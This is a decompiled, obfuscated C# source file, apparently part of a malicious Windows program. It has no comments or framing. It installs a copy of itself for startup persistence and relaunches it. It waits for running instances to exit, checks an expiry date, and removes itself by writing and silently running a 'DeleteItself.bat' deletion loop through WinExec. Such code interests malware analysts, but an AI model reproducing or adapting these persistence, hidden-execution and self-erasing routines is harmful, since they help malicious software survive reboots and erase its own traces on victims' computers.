using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Windows.Forms;

namespace ns0;

internal static class Class5
{
	[CompilerGenerated]
	private sealed class Class6
	{
		public string string_0;

		internal bool method_0(Process process_0)
		{
			return Delegate242.smethod_0(Delegate53.smethod_0(Delegate137.smethod_0(process_0)), string_0);
		}
	}

	internal static void smethod_0(Class2.Enum0 enum0_0, string string_0)
	{
		//IL_0008: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b5: Unknown result type (might be due to invalid IL or missing references)
		if (enum0_0 == Class2.Enum0.const_0)
		{
			Delegate84.smethod_0(Class12.StartModeDebug);
			return;
		}
		if (string_0 != null)
		{
			if (enum0_0 == Class2.Enum0.const_3)
			{
				string_0 = Delegate21.smethod_0(string_0, "?", " ");
				if (Delegate54.smethod_0(string_0) && Delegate156.smethod_0(string_0))
				{
					int num = 0;
					bool flag;
					do
					{
						string string_2 = Delegate140.smethod_0(string_0);
						string string_ = Delegate197.smethod_0(Delegate153.smethod_0(string_0));
						flag = Delegate186.smethod_0(string_2).FirstOrDefault((Process process_0) => Delegate242.smethod_0(Delegate53.smethod_0(Delegate137.smethod_0(process_0)), string_)) != null;
						Delegate167.smethod_0(100);
						num++;
					}
					while (flag && num < 100);
					Delegate167.smethod_0(300);
					if (!flag)
					{
						Delegate162.smethod_0(string_0);
					}
				}
			}
			if (enum0_0 == Class2.Enum0.const_1)
			{
				Delegate81.smethod_0(Class2.string_5, Class2.string_6, (MessageBoxButtons)0, (MessageBoxIcon)16);
			}
			if (Class2.bool_0)
			{
				Delegate86.smethod_0(0);
			}
			return;
		}
		string string_3 = Class2.string_8;
		if (Class2.string_9 != null)
		{
			string string_4 = Delegate98.smethod_0(Delegate200.smethod_0(Environment.SpecialFolder.Startup), Delegate233.smethod_0(Class2.string_9));
			Class11.smethod_0(Class2.enum1_0);
			if (Delegate208.smethod_0(Delegate70.smethod_0(), Class2.string_10) || Delegate208.smethod_0(Delegate70.smethod_0(), string_4))
			{
				return;
			}
		}
		if (smethod_1(Class2.string_10, bool_0: true))
		{
			smethod_1(string_3, bool_0: true);
		}
		string string_5 = Delegate21.smethod_0(Delegate70.smethod_0(), " ", "?");
		Delegate27.smethod_0(string_3, string_5);
		Delegate86.smethod_0(0);
	}

	internal static bool smethod_1(string string_0, bool bool_0)
	{
		if (Delegate208.smethod_0(Delegate70.smethod_0(), string_0))
		{
			return false;
		}
		Delegate34.smethod_0(Delegate197.smethod_0(Delegate153.smethod_0(string_0)));
		Delegate221.smethod_0(Delegate70.smethod_0(), string_0, bool_0);
		return true;
	}

	internal static bool smethod_2()
	{
		return Delegate184.smethod_0(Delegate210.smethod_0(), Class2.dateTime_0);
	}

	internal static void smethod_3()
	{
		if (Class2.enum0_0 == Class2.Enum0.const_0)
		{
			Delegate86.smethod_0(0);
		}
		try
		{
			Class11.smethod_3(Class2.string_10);
			HashSet<string> object_ = Delegate229.smethod_0();
			Delegate155.smethod_0(object_, Delegate40.smethod_0(Class2.string_10));
			Delegate155.smethod_0(object_, Delegate40.smethod_0(Class2.string_8));
			Delegate155.smethod_0(object_, Class2.string_12);
			HashSet<string>.Enumerator enumerator_ = Delegate80.smethod_0(object_);
			try
			{
				while (Delegate181.smethod_0(ref enumerator_))
				{
					string string_ = Delegate103.smethod_0(ref enumerator_);
					try
					{
						if (Delegate231.smethod_0(string_))
						{
							Delegate136.smethod_0(string_, bool_0: true);
						}
					}
					catch (Exception)
					{
					}
				}
			}
			finally
			{
				((IDisposable)enumerator_).Dispose();
			}
			string string_2 = Delegate127.smethod_0(Delegate40.smethod_0(Delegate70.smethod_0()), "\\DeleteItself.bat");
			StreamWriter streamWriter = Delegate65.smethod_0(string_2, bool_0: false, Delegate96.smethod_0());
			try
			{
				Delegate141.smethod_0(streamWriter, ":del\r\n del \"{0}\"\r\nif exist \"{0}\" goto del\r\ndel %0\r\n", Delegate70.smethod_0());
			}
			finally
			{
				if (streamWriter != null)
				{
					Delegate73.smethod_0(streamWriter);
				}
			}
			WinExec(string_2, 0u);
		}
		catch
		{
		}
		finally
		{
			try
			{
				Delegate86.smethod_0(0);
			}
			catch
			{
				Delegate183.smethod_0();
			}
		}
	}

	[DllImport("kernel32.dll")]
	public static extern uint WinExec(string string_0, uint uint_0);
}
